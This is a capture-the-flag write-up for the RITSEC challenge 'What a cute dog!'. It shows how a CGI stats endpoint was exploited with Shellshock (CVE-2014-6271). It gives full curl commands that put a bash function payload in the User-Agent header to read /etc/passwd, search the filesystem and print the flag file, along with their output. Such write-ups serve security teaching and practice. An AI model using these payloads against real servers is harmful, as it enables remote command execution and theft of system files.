# What a cute dog! 350

## Description
```
This dog is shockingly cute!
fun.ritsec.club:8008

Author: sandw1ch
```

## Solution

On acessing the page we notice that some load information are being shown on the site.
When inspecting it's being loaded from /cgi-bin/stats.
This is was a big hint that the site might be vulnerable to CVE 2014-6271 (better known as "Shellshock").
I tried a poc exploit: 

```bash
Kiwi@Doghouse:~$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://fun.ritsec.
club:8008/cgi-bin/stats

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```

Yaay it worked!  
Next I searched for the flag:


```bash
Kiwi@Doghouse:/home/hacker/Documents/ritsec# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -name 'flag*';'" http://fun.ritsec.club:8008/cgi-bin/stats

/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al
/opt/flag.txt
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
```

/opt/flag.txt looks promising!

```bash
Kiwi@Doghouse:/home/hacker/Documents/ritsec# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats

RITSEC{sh3ll_sh0cked_w0wz3rs} bananaphonne been here ^.^
admin pls dont let people write to this
tq2 wuz here
```


Flag: RITSEC{sh3ll_sh0cked_w0wz3rs}
